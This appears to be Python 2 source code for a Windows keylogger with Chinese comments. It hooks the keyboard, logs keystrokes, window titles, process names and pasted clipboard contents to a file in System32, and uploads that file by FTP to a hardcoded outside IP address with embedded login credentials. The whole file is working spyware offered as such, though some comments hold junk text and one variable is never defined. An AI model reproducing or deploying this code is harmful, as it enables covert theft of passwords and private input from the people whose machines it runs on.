# -*- coding: utf-8 -*-
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import win32gui
import win32ui
import win32con
import win32api
import time
import ftplib

#ftp上传aasbcxddddfbdfb
from ftplib import FTP
import os
def ftp_up(filename = "C:\\Windows\\System32\\output.txt"):
    ftp=FTP() 
    ftp.set_debuglevel(2)#打开调试级别2，显示详细信息;0为关闭调试信息 
    ftp.connect('140.143.12.118','21')#连接 
    ftp.login('administrator','x7cker')#登录，如果匿名登录则用空串代替即可 
    #print ftp.getwelcome()#显示ftp服务器欢迎信息
    ftp.cwd('1/') #选择操作目录
    bufsize = 1024#设置缓冲块大小 
    file_handler = open(filename,'rb')#以读模式在本地打开文件
    ftp.storbinary('STOR %s' % os.path.basename(filename),file_handler,bufsize)#上传文件 
    ftp.set_debuglevel(0)
    file_handler.close()
    ftp.quit()


user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

#
def get_current_process():

    # 获取最上层的窗口句柄aas柄aas
    hwnd = user32.GetForegroundWindow()

    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))

    # 将进程ID存入变量中
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # 读取窗口标题
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)

    # 打印
    f = open('C:\\Windows\\System32\\output.txt', 'a')
    print >> f, "" + '\n'
    f.close()
    f = open('C:\\Windows\\System32\\output.txt', 'a')
    print >>f,"[ PID:%s-%s-%s]   Time:%s" % (process_id,executable.value,windows_title.value,t)+'\n'
    f.close()
    f = open('C:\\Windows\\System32\\output.txt', 'a')
    print >>f,""+'\n'
    f.close()
    if t[15:16] == "5" or t[15:16] == "0":
        ftp_up()

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    f.close()



# 定义击键监听事件函数
def KeyStroke(event):

    global current_window

    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 函数调用
        get_current_process()

    # 检测击键是否常规按键（非组合键等）aaaaaaaasdsadasdsad
    if event.Ascii > 32 and event.Ascii <127:
        f = open('C:\\Windows\\System32\\output.txt', 'a')
        print >>f,chr(event.Ascii),
        f.close()
        if t[15:16] == "5" or t[15:16] == "0":
            ftp_up()
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f = open('C:\\Windows\\System32\\output.txt', 'a')
            print >>f,"[PASTE]-%s" % (pasted_value),
            f.close()
            if t[15:16] == "5" or t[15:16] == "0":
                ftp_up()
        else:
            f = open('C:\\Windows\\System32\\output.txt', 'a')
            print >>f,"[%s]" % event.Key,
            f.close()
            if t[15:16] == "5" or t[15:16] == "0":
                ftp_up()
    # 循环监听下一个击键事件事件
    return True

def main():
    # 创建并注册hook管理器
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke

# 注册hook并执行
    kl.HookKeyboard()
    pythoncom.PumpMessages()
    ftp_up()
	
if __name__ =="__main__":
    main()
